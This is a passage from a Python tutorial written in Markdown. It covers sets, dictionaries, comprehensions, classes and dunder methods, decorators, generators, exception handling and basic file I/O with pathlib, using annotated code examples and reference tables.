# ── Frozen set — immutable, hashable set ───────────────────────
fs = frozenset({1, 2, 3})   # cannot add or remove; can be used as dict key
```

### Time Complexities

| Operation | Complexity | Notes |
|-----------|------------|-------|
| `x in s` | O(1) average | Hash-based lookup |
| `s.add(x)` | O(1) average | Hash-based insert |
| `s.remove(x)` | O(1) average | Hash-based delete |
| Union/Intersection | O(n) | Iterates elements |

---

## 2.4 Dictionaries

> **What is a dictionary?** A dict is a **key-value** mapping. Keys must be hashable (strings, numbers, tuples). Lookup by key is O(1) — much faster than searching a list. In Python 3.7+, dicts maintain insertion order.

> **Syntax**: `{key: value, ...}` or `dict(key=value, ...)`

```python
# ── Creating dictionaries ──────────────────────────────────────
d = {"name": "Alice", "age": 30}        # literal: key-value pairs with colon
d = dict(name="Alice", age=30)          # using dict() with keyword args
d = dict([("name", "Alice"), ("age", 30)])  # from list of (key, value) tuples
d = {k: v for k, v in items}            # dict comprehension

# ── Accessing values ───────────────────────────────────────────
d["name"]              # "Alice" — raises KeyError if key doesn't exist
d.get("name")          # "Alice" — returns None if not found (safe, no error)
d.get("phone", "N/A")  # "N/A"   — returns default if not found

# ── Adding and modifying ───────────────────────────────────────
d["city"] = "NYC"                     # add new key or update existing key
d.update({"age": 31, "job": "dev"})   # merge another dict in
d.update(age=31, job="dev")           # keyword form of update

# ── Removing ──────────────────────────────────────────────────
del d["age"]
d.pop("age")           # remove key and RETURN its value — raises KeyError if missing
d.pop("age", None)     # safe pop — returns None instead of raising error
d.popitem()            # remove and return LAST inserted (key, value) pair (Python 3.7+)

# ── Iterating over a dict ──────────────────────────────────────
for k in d:                 # iterate over KEYS (default behavior)
    print(k)
for k in d.keys():          # same — explicitly iterate keys
    print(k)
for v in d.values():        # iterate over VALUES only
    print(v)
for k, v in d.items():      # iterate over (key, value) PAIRS — most common
    print(k, v)

# ── Membership test ────────────────────────────────────────────
"name" in d         # True  — O(1) check if KEY exists
"phone" in d        # False — missing key

# ── Merge dicts (Python 3.9+) ─────────────────────────────────
d1 = {"a": 1}
d2 = {"b": 2}
merged = d1 | d2        # {"a": 1, "b": 2} — creates new merged dict
d1 |= d2                # in-place merge (d1 now contains both)

# ── defaultdict — auto-creates missing keys ────────────────────
from collections import defaultdict
dd = defaultdict(list)              # default value is an empty list
dd["fruits"].append("apple")        # no KeyError — creates [] for "fruits" first

dd = defaultdict(int)               # default value is 0
for word in words:
    dd[word] += 1   # word frequency counter — no need to check if key exists

# ── Counter — specialized dict for counting ────────────────────
from collections import Counter
c = Counter("abracadabra")          # count each character
# Counter({'a': 5, 'b': 2, 'r': 2, 'c': 1, 'd': 1})
c.most_common(3)    # [('a',5), ('b',2), ('r',2)] — top 3 most common
c['a']              # 5  — count of 'a'
c['z']              # 0  — missing key returns 0, NOT KeyError!

# ── OrderedDict (less needed in Python 3.7+ where dicts are ordered) ─
from collections import OrderedDict
od = OrderedDict()
od.move_to_end("key")   # move a key to front or back

# ── setdefault — init key only if missing ─────────────────────
d.setdefault("scores", []).append(100)  # if "scores" missing, creates []; then appends 100
```

### Time Complexities

| Operation | Complexity | Notes |
|-----------|------------|-------|
| `d[key]` | O(1) average | Hash lookup |
| `d[key] = val` | O(1) average | Hash insert |
| `key in d` | O(1) average | Hash lookup |
| Iteration | O(n) | Visits all pairs |

---

## 2.5 Comprehensions

> **What are comprehensions?** Comprehensions are a concise, readable way to create lists, dicts, sets, or generators from existing iterables. They replace many `for` loops with a single expressive line.

### List Comprehension

> **Syntax**: `[expression for variable in iterable if condition]`

```python
# ── Basic list comprehension ───────────────────────────────────
squares = [x**2 for x in range(10)]    # [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]

# ── With filter condition ──────────────────────────────────────
evens = [x for x in range(20) if x % 2 == 0]   # [0, 2, 4, 6, ..., 18]

# ── Nested — flatten a 2D matrix ──────────────────────────────
flat = [x for row in matrix for x in row]       # reads: "for each row, for each x in row"

# ── Applying a function ────────────────────────────────────────
words = ["hello", "world"]
upper = [w.upper() for w in words]              # ['HELLO', 'WORLD']

# ── Conditional expression (ternary) inside comprehension ─────
labels = ["even" if x%2==0 else "odd" for x in range(10)]  # label each number
```

### Dict Comprehension

> **Syntax**: `{key_expr: value_expr for variable in iterable if condition}`

```python
# ── Invert a dict (swap keys and values) ──────────────────────
d = {"a": 1, "b": 2, "c": 3}
inverted = {v: k for k, v in d.items()}  # {1:"a", 2:"b", 3:"c"}

# ── Filter dict entries ────────────────────────────────────────
filtered = {k: v for k, v in d.items() if v > 1}   # keeps only entries where value > 1

# ── Build dict from two parallel lists ────────────────────────
keys = ["name", "age"]
vals = ["Alice", 30]
result = {k: v for k, v in zip(keys, vals)}   # {"name": "Alice", "age": 30}
```

### Set Comprehension

> **Syntax**: `{expression for variable in iterable}` — automatically deduplicates

```python
unique_squares = {x**2 for x in range(-5, 6)}  # {0, 1, 4, 9, 16, 25} — no duplicates
```

### Generator Expression

> **Syntax**: `(expression for variable in iterable)` — lazy, memory-efficient

```python
# Generator — elements computed ON DEMAND (lazy evaluation)
gen = (x**2 for x in range(1000000))   # no computation yet — just creates generator object
total = sum(x**2 for x in range(1000000))  # efficient — never holds all 1M values in RAM

# vs list comprehension — computes EVERYTHING immediately
lst = [x**2 for x in range(1000000)]   # all 1M values in memory RIGHT NOW

# Use generators when you only need to iterate once and don't need all values at once
```

---

# Unit 3: Object-Oriented Programming

> **What is OOP?** Object-Oriented Programming is a way of organizing code around **objects** — things that have both data (attributes) and behavior (methods). A **class** is the blueprint; an **object** (instance) is the actual thing built from that blueprint.

## 3.1 Classes & Objects

> **Syntax**: `class ClassName:` then `def __init__(self, params):` for the constructor

```python
class Dog:
    # ── Class variable — shared by ALL instances of Dog ───────
    species = "Canis familiaris"   # all dogs share this (not per-instance)
    count = 0                      # tracks how many Dog objects exist

    def __init__(self, name, age):
        """Constructor — runs automatically when Dog(...) is called"""
        self.name = name        # instance variable — unique to each dog
        self.age = age          # instance variable
        Dog.count += 1          # increment class-level counter

    def __str__(self):
        """Called by print() and str() — user-friendly string"""
        return f"Dog({self.name}, {self.age})"

    def __repr__(self):
        """Called in REPL and repr() — developer/debug string"""
        return f"Dog(name={self.name!r}, age={self.age!r})"

    def bark(self):
        """Regular instance method — has access to self"""
        return f"{self.name} says: Woof!"

    @classmethod
    def from_birth_year(cls, name, birth_year):
        """Alternative constructor (factory method) — cls is the class itself"""
        age = 2026 - birth_year    # calculate age from birth year
        return cls(name, age)      # create and return new Dog instance

    @staticmethod
    def is_adult(age):
        """Static method — no access to class or instance; just a utility function"""
        return age >= 2            # dogs are adults at 2+ years


# ── Using the class ────────────────────────────────────────────
d = Dog("Rex", 3)           # creates a Dog instance — calls __init__
print(d)                    # Dog(Rex, 3) — calls __str__
repr(d)                     # Dog(name='Rex', age=3) — calls __repr__
d.bark()                    # "Rex says: Woof!" — calls instance method
Dog.species                 # "Canis familiaris" — access class variable via class
d.species                   # "Canis familiaris" — can also access via instance
Dog.count                   # 1 — one dog created so far

d2 = Dog.from_birth_year("Buddy", 2020)  # use classmethod alternative constructor
Dog.is_adult(3)             # True — static method called on class
d.is_adult(d.age)           # True — can also call on instance
```

### `__init__` vs `__new__`

> `__new__` creates the object (memory allocation); `__init__` initializes it (set attributes). You rarely override `__new__` — the main use case is the Singleton pattern.

```python
class Singleton:
    _instance = None    # class variable to hold the single instance

    def __new__(cls, *args, **kwargs):
        if not cls._instance:                        # if no instance exists yet...
            cls._instance = super().__new__(cls)     # ...create one (only once)
        return cls._instance                         # always return the same instance

    def __init__(self, val):
        self.val = val   # this runs every time, but __new__ only creates once
```

---

## 3.2 Inheritance

> **What is inheritance?** Inheritance lets a child class reuse code from a parent class. The child class can also override parent methods to provide its own behavior. This is called **polymorphism**.

> **Syntax**: `class Child(Parent):` — put parent class in parentheses

```python
class Animal:
    def __init__(self, name):
        self.name = name    # all animals have a name

    def speak(self):
        raise NotImplementedError("Subclass must implement speak()")  # forces subclasses to implement this

    def __str__(self):
        return f"{type(self).__name__}({self.name})"  # type(self).__name__ = "Dog", "Cat", etc.


class Dog(Animal):       # Dog inherits from Animal
    def speak(self):     # OVERRIDES Animal.speak()
        return f"{self.name}: Woof!"


class Cat(Animal):       # Cat also inherits from Animal
    def speak(self):     # OVERRIDES with different behavior
        return f"{self.name}: Meow!"


# ── Polymorphism — same interface, different behavior ─────────
animals = [Dog("Rex"), Cat("Whiskers")]
for a in animals:
    print(a.speak())    # each uses its OWN speak() — "Rex: Woof!" then "Whiskers: Meow!"

# ── Checking relationships ─────────────────────────────────────
isinstance(Dog("Rex"), Animal)   # True  — a Dog IS an Animal
issubclass(Dog, Animal)          # True  — Dog is a subclass of Animal
```

### Multiple Inheritance & MRO

> Python uses **C3 Linearization** (MRO = Method Resolution Order) to decide which parent's method to call when a class inherits from multiple parents.

```python
class A:
    def method(self): return "A"

class B(A):
    def method(self): return "B"   # overrides A.method

class C(A):
    def method(self): return "C"   # overrides A.method

class D(B, C):   # inherits from BOTH B and C
    pass

D.mro()       # [D, B, C, A, object] — Python searches in this order
D().method()  # "B" — finds it in B first (left to right in MRO)
```

### super()

> `super()` calls the **next class in the MRO chain** — usually the parent class. Always use `super().__init__(...)` in child constructors to properly initialize the parent.

```python
class Vehicle:
    def __init__(self, brand, speed):
        self.brand = brand      # stored on the instance
        self.speed = speed

class Car(Vehicle):
    def __init__(self, brand, speed, doors):
        super().__init__(brand, speed)   # call Vehicle.__init__ first — set brand and speed
        self.doors = doors               # then set car-specific attribute

class ElectricCar(Car):
    def __init__(self, brand, speed, doors, battery):
        super().__init__(brand, speed, doors)   # call Car.__init__ — sets brand, speed, doors
        self.battery = battery                  # then set electric-specific attribute
```

---

## 3.3 Magic/Dunder Methods

> **What are dunder methods?** Dunder (double underscore) methods like `__add__`, `__len__`, `__str__` let your classes integrate with Python's built-in operators and functions. When you write `v1 + v2`, Python calls `v1.__add__(v2)`.

> **Syntax**: `def __methodname__(self, ...):` — Python calls these automatically

```python
class Vector:
    def __init__(self, x, y):
        self.x = x    # x component
        self.y = y    # y component

    # ── String representation ──────────────────────────────────
    def __str__(self):      return f"Vector({self.x}, {self.y})"        # called by print()
    def __repr__(self):     return f"Vector(x={self.x}, y={self.y})"    # called by repr(), REPL

    # ── Arithmetic operators ───────────────────────────────────
    def __add__(self, other):  return Vector(self.x+other.x, self.y+other.y)  # v1 + v2
    def __sub__(self, other):  return Vector(self.x-other.x, self.y-other.y)  # v1 - v2
    def __mul__(self, scalar): return Vector(self.x*scalar, self.y*scalar)    # v1 * 3
    def __rmul__(self, scalar):return self.__mul__(scalar)   # 3 * v1 (reversed operands)
    def __neg__(self):         return Vector(-self.x, -self.y)    # -v1
    def __abs__(self):         return (self.x**2 + self.y**2) ** 0.5  # abs(v1) = magnitude

    # ── Comparison operators ───────────────────────────────────
    def __eq__(self, other):   return self.x==other.x and self.y==other.y  # v1 == v2
    def __lt__(self, other):   return abs(self) < abs(other)               # v1 < v2

    # ── Container-like behavior ────────────────────────────────
    def __len__(self):         return 2                          # len(v) = 2
    def __getitem__(self, i):  return (self.x, self.y)[i]       # v[0], v[1]
    def __iter__(self):        return iter((self.x, self.y))    # for val in v:
    def __contains__(self, v): return v in (self.x, self.y)    # 1 in v

    # ── Callable — object acts like a function ─────────────────
    def __call__(self, scale): return Vector(self.x*scale, self.y*scale)  # v(10)

    # ── Context manager (with statement) ──────────────────────
    def __enter__(self):       return self                       # with v: ...
    def __exit__(self, *args): print("cleanup")                 # runs at end of with block

    # ── Boolean — truthiness ──────────────────────────────────
    def __bool__(self):        return self.x != 0 or self.y != 0  # bool(v)

    # ── Hashing — allows use in sets and as dict keys ─────────
    def __hash__(self):        return hash((self.x, self.y))    # hash(v)


v1 = Vector(1, 2)
v2 = Vector(3, 4)
v1 + v2         # Vector(4, 6)    — calls __add__
abs(v1)         # 2.236...        — calls __abs__
3 * v1          # Vector(3, 6)    — calls __rmul__
list(v1)        # [1, 2]          — calls __iter__
1 in v1         # True            — calls __contains__
v1(10)          # Vector(10, 20)  — calls __call__
```

### Common Dunder Methods Reference

| Method | Trigger | Use |
|--------|---------|-----|
| `__init__` | `MyClass()` | Constructor |
| `__new__` | `MyClass()` | Object creation |
| `__del__` | Object deleted | Destructor |
| `__str__` | `str(x)`, `print(x)` | User-friendly string |
| `__repr__` | `repr(x)`, REPL | Debug string |
| `__len__` | `len(x)` | Length |
| `__getitem__` | `x[i]` | Subscript |
| `__setitem__` | `x[i] = v` | Assignment |
| `__delitem__` | `del x[i]` | Deletion |
| `__contains__` | `v in x` | Membership |
| `__iter__` | `for v in x` | Iteration |
| `__next__` | `next(x)` | Next item |
| `__enter__` | `with x:` | Context enter |
| `__exit__` | `with x:` end | Context exit |
| `__call__` | `x()` | Callable |
| `__eq__` | `x == y` | Equality |
| `__hash__` | `hash(x)` | Hash |
| `__bool__` | `bool(x)`, `if x` | Truthiness |
| `__add__` | `x + y` | Addition |
| `__iadd__` | `x += y` | In-place add |
| `__lt__`,`__le__`... | `<`, `<=`... | Ordering |

---

## 3.4 Properties & Descriptors

> **What are properties?** `@property` lets you define computed or validated attributes that *look* like plain attributes but run code on get/set/delete. Keeps the API clean (no `get_x()` / `set_x()` needed).

> **Syntax**:
> ```
> @property              # getter
> def name(self): ...
> @name.setter           # setter (optional)
> def name(self, value): ...
> @name.deleter          # deleter (optional)
> def name(self): ...
> ```

```python
class Temperature:
    def __init__(self, celsius=0):
        self._celsius = celsius      # _celsius = "private" backing attribute

    @property
    def celsius(self):
        """Getter — called when you read t.celsius"""
        return self._celsius         # just return the backing attribute

    @celsius.setter
    def celsius(self, value):
        """Setter — called when you write t.celsius = value"""
        if value < -273.15:
            raise ValueError("Below absolute zero!")  # validate before storing
        self._celsius = value        # store in backing attribute

    @celsius.deleter
    def celsius(self):
        """Deleter — called on del t.celsius"""
        del self._celsius            # remove the backing attribute

    @property
    def fahrenheit(self):
        """Computed / read-only property — no setter defined"""
        return self._celsius * 9/5 + 32   # derived from celsius, recalculated every time


t = Temperature(100)
t.celsius         # 100    — calls getter
t.fahrenheit      # 212.0  — calls computed property
t.celsius = 200   # calls setter (valid)
t.celsius = -300  # raises ValueError — setter validation fires
del t.celsius     # calls deleter
```

### Descriptor Protocol

> **What is the descriptor protocol?** A descriptor is any object that defines `__get__`, `__set__`, or `__delete__`. `@property` is itself a descriptor. Use descriptors to share validation logic across multiple attributes or classes.

```python
class Validator:
    """Data descriptor (has both __get__ and __set__)"""
    def __set_name__(self, owner, name):
        """Called automatically when class is created — stores the attribute name"""
        self.name = name             # e.g. "radius" — used for error messages & dict key

    def __get__(self, obj, objtype=None):
        """Called when the attribute is read: obj.name"""
        if obj is None:
            return self              # class-level access → return descriptor itself
        return obj.__dict__.get(self.name)   # read from instance __dict__ directly

    def __set__(self, obj, value):
        """Called when the attribute is written: obj.name = value"""
        if not isinstance(value, (int, float)):
            raise TypeError(f"{self.name} must be numeric")  # reusable validation
        obj.__dict__[self.name] = value    # write to instance __dict__


class Circle:
    radius = Validator()     # descriptor instance as a class attribute

    def __init__(self, radius):
        self.radius = radius  # triggers Validator.__set__ → validates!

    @property
    def area(self):
        import math
        return math.pi * self.radius ** 2   # Validator.__get__ called here
```

---

## 3.5 Abstract Classes & Interfaces

> **What is an Abstract Class?** A class you can't instantiate directly — it defines a *contract* that subclasses must fulfil. Ensures every subclass implements required methods. Python uses the `abc` module.

> **Syntax**:
> ```
> from abc import ABC, abstractmethod
> class MyABC(ABC):
>     @abstractmethod
>     def method(self): ...
> ```

```python
from abc import ABC, abstractmethod

class Shape(ABC):                # ABC = Abstract Base Class — cannot be instantiated
    @abstractmethod
    def area(self) -> float:
        """Subclasses MUST implement this — or they can't be instantiated"""
        ...                      # body can be ... or pass or raise NotImplementedError

    @abstractmethod
    def perimeter(self) -> float:
        """Another required method"""
        ...

    def describe(self):
        """Concrete method — shared behavior, no override required"""
        return f"{type(self).__name__}: area={self.area():.2f}"


class Circle(Shape):
    def __init__(self, radius):
        self.radius = radius     # store radius

    def area(self):
        import math
        return math.pi * self.radius ** 2   # implements abstract method ✓

    def perimeter(self):
        import math
        return 2 * math.pi * self.radius    # implements abstract method ✓


class Rectangle(Shape):
    def __init__(self, w, h):
        self.w = w               # width
        self.h = h               # height

    def area(self):      return self.w * self.h            # implements ✓
    def perimeter(self): return 2 * (self.w + self.h)      # implements ✓


# Shape()      # TypeError! Cannot instantiate abstract class
c = Circle(5)
c.describe()   # "Circle: area=78.54" — uses concrete inherited method
c.area()       # 78.53...
c.perimeter()  # 31.41...

# isinstance / issubclass checks still work
isinstance(c, Shape)      # True — Circle IS a Shape
issubclass(Circle, Shape) # True
```

---

# Unit 4: Functional Programming

> **What is functional programming?** A style where functions are the primary building blocks — you pass them around, compose them, and avoid mutable state. Python supports both OOP and functional styles.

## 4.1 First-Class Functions

> **What does "first-class" mean?** Functions are objects just like integers or strings — they can be assigned to variables, stored in lists, and passed as arguments.

> **Syntax**: `variable = function_name` (no parentheses — just reference, don't call)

```python
# Functions are objects — they have a type, can be assigned, etc.
def square(x):
    return x ** 2

f = square          # assign function to variable (no () = don't call, just reference)
f(5)                # 25 — call via the variable

funcs = [square, abs, str]   # store multiple functions in a list

def apply(func, value):
    """Higher-order function — takes another function as argument"""
    return func(value)       # call the passed function

apply(square, 4)    # 16 — square(4)
apply(abs, -7)      # 7  — abs(-7)
apply(str, 42)      # "42" — str(42)
```

## 4.2 Lambda Functions

> **What are lambdas?** Anonymous (unnamed) single-expression functions. Used inline where a short function is needed without a full `def`. Cannot contain statements (no `if/else` blocks, no `return` keyword).

> **Syntax**: `lambda arg1, arg2: expression`

```python
square = lambda x: x ** 2        # equivalent to: def square(x): return x**2
add = lambda x, y: x + y         # two arguments
identity = lambda x: x           # returns argument unchanged

# ── Common uses ────────────────────────────────────────────────
nums = [3, 1, 4, 1, 5, 9, 2, 6]
nums.sort(key=lambda x: -x)           # sort descending by negating each value

pairs = [(1, 'b'), (2, 'a'), (3, 'c')]
sorted(pairs, key=lambda p: p[1])     # sort list of tuples by second element

# ── With map/filter ────────────────────────────────────────────
doubled = list(map(lambda x: x*2, nums))   # apply lambda to each element
odds = list(filter(lambda x: x%2, nums))   # keep elements where lambda returns True
```

## 4.3 Map, Filter, Reduce

> **What are these?** Higher-order functions from functional programming. Modern Python prefers comprehensions, but these appear in many codebases.

> **Syntax**: `map(func, iterable)` · `filter(func, iterable)` · `reduce(func, iterable[, initial])`

```python
from functools import reduce   # reduce moved to functools in Python 3

nums = [1, 2, 3, 4, 5]

# map — apply a function to EVERY element, returns a lazy iterator
squares = list(map(lambda x: x**2, nums))   # [1, 4, 9, 16, 25]

# filter — keep only elements where function returns True
evens = list(filter(lambda x: x%2==0, nums))   # [2, 4]

# reduce — fold left: applies function cumulatively
# ((1+2)+3)+4)+5 = 15
total = reduce(lambda a, b: a+b, nums)       # 15 — sum of all
product = reduce(lambda a, b: a*b, nums, 1) # 120 — product (1 = initial value)

# ── Modern Pythonic equivalents (preferred in real code) ───────
squares = [x**2 for x in nums]      # list comprehension — clearer than map
evens = [x for x in nums if x%2==0] # list comprehension — clearer than filter
total = sum(nums)                    # built-in sum — clearer than reduce
```

## 4.4 Closures

> **What is a closure?** A function that *captures* variables from its enclosing scope, even after that scope has finished executing. The inner function "closes over" the outer variable.

> **Syntax**: Define a function inside another function and return it.

```python
def make_multiplier(n):
    """Factory function — returns a new function each time"""
    def multiplier(x):
        return x * n    # n is captured (closed over) from make_multiplier's scope
    return multiplier   # return the inner function (don't call it!)

double = make_multiplier(2)   # double = multiplier with n=2 baked in
triple = make_multiplier(3)   # triple = multiplier with n=3 baked in
double(5)   # 10  — calls multiplier(5) with n=2
triple(5)   # 15  — calls multiplier(5) with n=3

# ── Closure with mutable state ────────────────────────────────
def make_counter(start=0):
    count = [start]   # list because mutable; avoids needing `nonlocal`
    def counter():
        count[0] += 1   # mutate the list (not rebind) — works without nonlocal
        return count[0]
    return counter

c = make_counter()
c()  # 1
c()  # 2

# ── Classic closure gotcha ────────────────────────────────────
funcs = [lambda: i for i in range(3)]
[f() for f in funcs]   # [2, 2, 2] ← all return 2! All share the SAME i variable

# Fix: capture i as a default argument (each lambda gets its own copy)
funcs = [lambda i=i: i for i in range(3)]
[f() for f in funcs]   # [0, 1, 2] ✓ — each lambda has its own i
```

## 4.5 Decorators

> **What are decorators?** Functions (or classes) that wrap another function to add behavior *before or after* it runs, without modifying the original code. Used for logging, timing, caching, auth checks.

> **Syntax**: `@decorator` above a `def` — equivalent to `func = decorator(func)`

```python
import functools
import time

# ── Basic decorator ────────────────────────────────────────────
def timer(func):
    @functools.wraps(func)   # preserve __name__, __doc__ of wrapped function
    def wrapper(*args, **kwargs):
        start = time.perf_counter()        # record start time
        result = func(*args, **kwargs)     # call the original function
        end = time.perf_counter()          # record end time
        print(f"{func.__name__} took {end-start:.4f}s")  # print duration
        return result                      # return original result
    return wrapper                         # return wrapped version

@timer                    # equivalent to: slow_function = timer(slow_function)
def slow_function():
    time.sleep(0.1)

slow_function()   # prints "slow_function took 0.1002s"

# ── Decorator with arguments (factory pattern) ────────────────
def repeat(times):          # outer function takes decorator argument
    def decorator(func):    # middle function wraps the function
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            for _ in range(times):           # run N times
                result = func(*args, **kwargs)
            return result
        return wrapper
    return decorator         # return decorator

@repeat(3)                  # equivalent to: greet = repeat(3)(greet)
def greet(name):
    print(f"Hello, {name}!")

greet("Alice")   # prints "Hello, Alice!" 3 times

# ── Class-based decorator ─────────────────────────────────────
class Memoize:
    """Caches function results — speeds up repeated calls with same args"""
    def __init__(self, func):
        functools.update_wrapper(self, func)  # copy metadata from func
        self.func = func        # store original function
        self.cache = {}         # result cache: {args: result}

    def __call__(self, *args):
        if args not in self.cache:
            self.cache[args] = self.func(*args)  # compute and cache
        return self.cache[args]   # return cached result

@Memoize
def fib(n):
    if n < 2:
        return n
    return fib(n-1) + fib(n-2)

# ── Built-in decorators ────────────────────────────────────────
class MyClass:
    @classmethod                   # receives class as first arg (cls)
    def class_method(cls): pass

    @staticmethod                  # no implicit first argument
    def static_method(): pass

    @property                      # getter — accessed as obj.prop
    def prop(self): return self._prop

# ── functools.lru_cache — built-in memoization ────────────────
from functools import lru_cache

@lru_cache(maxsize=128)     # cache up to 128 unique call signatures
def expensive(n):
    return sum(range(n))

@lru_cache(maxsize=None)    # unlimited cache size
def fib(n):
    if n < 2: return n
    return fib(n-1) + fib(n-2)

fib.cache_info()    # CacheInfo(hits=..., misses=..., maxsize=None, currsize=...)
fib.cache_clear()   # wipe the cache
```

## 4.6 Generators & Iterators

> **What are generators?** Functions that `yield` values one at a time, pausing execution between each. **Memory efficient** — items generated on demand, not all at once. Use for large datasets, infinite sequences, pipelines.

> **Syntax**: Use `yield` instead of `return`. Call `next()` to advance.

### Iterator Protocol

```python
class CountUp:
    """Custom iterator — implements the iterator protocol manually"""
    def __init__(self, start, stop):
        self.current = start   # track current position
        self.stop = stop       # exclusive upper bound

    def __iter__(self):
        return self            # an iterator must return itself from __iter__

    def __next__(self):
        if self.current >= self.stop:
            raise StopIteration   # signal that iteration is done
        val = self.current
        self.current += 1
        return val            # yield one value

for n in CountUp(1, 5):
    print(n)   # 1  2  3  4  (stops before 5)
```

### Generator Functions

```python
def count_up(start, stop):
    """Generator — same as CountUp class above, much shorter"""
    current = start
    while current < stop:
        yield current        # pause here, return current value to caller
        current += 1         # resume here on next()

gen = count_up(1, 5)       # creates generator object (doesn't run yet)
next(gen)   # 1  — runs until first yield
next(gen)   # 2  — runs until next yield
list(gen)   # [3, 4] — exhausts the remaining generator

# ── Generator with send() ─────────────────────────────────────
def accumulator():
    total = 0
    while True:
        value = yield total   # yield sends total OUT, receives value IN via send()
        total += value        # accumulate

acc = accumulator()
next(acc)        # prime the generator — runs to first yield → 0
acc.send(10)     # send 10 in, get running total 10 out
acc.send(20)     # send 20 in, get running total 30 out

# ── yield from — delegate to sub-generator ────────────────────
def flatten(lst):
    for item in lst:
        if isinstance(item, list):
            yield from flatten(item)   # recursively delegate — no loop needed
        else:
            yield item                 # yield scalar values directly

list(flatten([1, [2, [3, 4], 5], 6]))  # [1, 2, 3, 4, 5, 6]

# ── Infinite generators ────────────────────────────────────────
def naturals():
    n = 1
    while True:
        yield n    # yields forever — caller decides when to stop
        n += 1

from itertools import islice
list(islice(naturals(), 10))   # [1,2,3,4,5,6,7,8,9,10] — take first 10
```

> 📺 **Lecture**: [Generators — David Beazley (PyCon)](https://youtu.be/5-qadlG7tWo)

---

# Unit 5: Error Handling & Exceptions

> **What are exceptions?** Events that disrupt normal program flow — file not found, bad input, network error. Python uses `try/except` to handle them gracefully instead of crashing.

## Exception Hierarchy

```
BaseException
├── SystemExit              ← raised by sys.exit()
├── KeyboardInterrupt       ← Ctrl+C
├── GeneratorExit           ← generator.close()
└── Exception               ← base of all "normal" exceptions — catch this for broad catches
    ├── ArithmeticError
    │   ├── ZeroDivisionError    ← x / 0
    │   └── OverflowError        ← number too large
    ├── AttributeError           ← obj.missing_attr
    ├── ImportError
    │   └── ModuleNotFoundError  ← import nonexistent
    ├── IndexError               ← list[999]
    ├── KeyError                 ← dict["missing"]
    ├── NameError
    │   └── UnboundLocalError    ← used before assignment
    ├── OSError (IOError, FileNotFoundError, PermissionError...)
    ├── StopIteration            ← next() on exhausted iterator
    ├── TypeError                ← wrong type ("a" + 1)
    ├── ValueError               ← right type, wrong value (int("abc"))
    │   └── UnicodeError
    └── RuntimeError
        └── RecursionError       ← max recursion depth exceeded
```

## try / except / else / finally

> **Syntax**:
> ```
> try:
>     <risky code>
> except ExceptionType as e:
>     <handle error>
> else:
>     <runs only if NO exception>
> finally:
>     <ALWAYS runs — cleanup>
> ```

```python
def divide(a, b):
    try:
        result = a / b             # might raise ZeroDivisionError or TypeError
    except ZeroDivisionError:
        print("Cannot divide by zero")  # handle specific error
        return None
    except TypeError as e:
        print(f"Type error: {e}")   # `e` holds the exception object
        return None
    else:
        print("Success!")           # only runs if try block had NO exception
        return result
    finally:
        print("Done")               # ALWAYS runs — even if exception or return

# ── Catching multiple exceptions at once ──────────────────────
try:
    x = int(input())
except (ValueError, TypeError) as e:   # tuple of exception types
    print(f"Bad input: {e}")

# ── Catch-all (broad — use sparingly, only at top level) ──────
try:
    risky()
except Exception as e:
    print(f"Error: {e}")   # catches any non-system exception

# ── Re-raise the same exception ───────────────────────────────
try:
    process()
except ValueError:
    log_error()    # do something
    raise          # re-raise the original exception unchanged

# ── Exception chaining (raise from) ──────────────────────────
try:
    import missing_module
except ImportError as e:
    raise RuntimeError("Setup failed") from e  # chains: RuntimeError caused by ImportError
```

## Custom Exceptions

> **Why custom exceptions?** Give callers specific, meaningful errors to catch — instead of a generic `ValueError`.

```python
class AppError(Exception):
    """Base exception for this app — catch this to catch all app errors"""
    pass

class ValidationError(AppError):
    """Raised when user input fails validation"""
    def __init__(self, field, message):
        self.field = field          # which field had the problem
        self.message = message      # human-readable message
        super().__init__(f"{field}: {message}")   # set str(e) message

class DatabaseError(AppError):
    """Raised when a DB operation fails"""
    pass


try:
    raise ValidationError("email", "invalid format")
except ValidationError as e:
    print(e.field)    # "email"
    print(e.message)  # "invalid format"
    print(e)          # "email: invalid format"
```

## Context Managers

> **What is a context manager?** An object that sets up and tears down resources automatically. Works with `with` statement. Guarantees cleanup even if an exception occurs.

> **Syntax**: `with context_manager() as var:` — calls `__enter__` on entry, `__exit__` on exit

```python
# ── Built-in context manager (file) ───────────────────────────
with open("file.txt", "r") as f:
    content = f.read()   # work with file
# file is always closed here — even if an exception occurred inside

# ── Multiple context managers on one line ─────────────────────
with open("in.txt") as fin, open("out.txt", "w") as fout:
    fout.write(fin.read())    # both files auto-closed at end

# ── contextlib — generator-based context manager ──────────────
from contextlib import contextmanager

@contextmanager
def timer():
    import time
    start = time.perf_counter()
    try:
        yield         # code inside the `with` block runs here
    finally:
        end = time.perf_counter()
        print(f"Elapsed: {end-start:.3f}s")   # always prints, even on error

with timer():
    time.sleep(0.5)   # prints "Elapsed: 0.500s"
```

---

# Unit 6: File I/O & OS Module

> **Why file I/O matters?** Reading configs, logs, data files, writing reports — nearly every real program touches the filesystem. Python's `open()`, `pathlib`, and `os` cover 99% of use cases.

## File Operations

> **Syntax**: `open(path, mode)` — always use `with` so file closes automatically
> **Modes**: `"r"` read · `"w"` write (truncate) · `"a"` append · `"x"` create (fail if exists) · `"b"` binary · `"+"` read+write

```python
# ── Write ──────────────────────────────────────────────────────
with open("data.txt", "w") as f:       # "w" = write mode (creates or overwrites)
    f.write("Hello\n")                  # write single string
    f.writelines(["Line 1\n", "Line 2\n"])  # write list of strings

# ── Read ───────────────────────────────────────────────────────
with open("data.txt", "r") as f:       # "r" = read mode (default)
    content = f.read()                  # read entire file as one string
    f.seek(0)                           # rewind to beginning
    lines = f.readlines()               # read all lines → list of strings
    f.seek(0)                           # rewind again
    for line in f:                      # iterate line by line — memory efficient
        print(line.strip())             # .strip() removes trailing \n

# ── Append ─────────────────────────────────────────────────────
with open("data.txt", "a") as f:       # "a" = append mode — never truncates
    f.write("Appended\n")

# ── Binary files ───────────────────────────────────────────────
with open("image.png", "rb") as f:     # "rb" = read binary
    data = f.read()                     # raw bytes
```

## pathlib (Modern Path Handling)

> **Why pathlib over os.path?** Object-oriented, cross-platform, much cleaner syntax. Use `/` operator to join paths.

> **Syntax**: `Path("some/path")` — then call methods on it

```python
from pathlib import Path

p = Path("data/output.txt")
p.parent        # Path("data") — parent directory
p.name          # "output.txt" — filename with extension
p.stem          # "output" — filename without extension
p.suffix        # ".txt" — just the extension
p.exists()      # True/False — does it exist on disk?
p.is_file()     # True/False — is it a file?
p.is_dir()      # True/False — is it a directory?

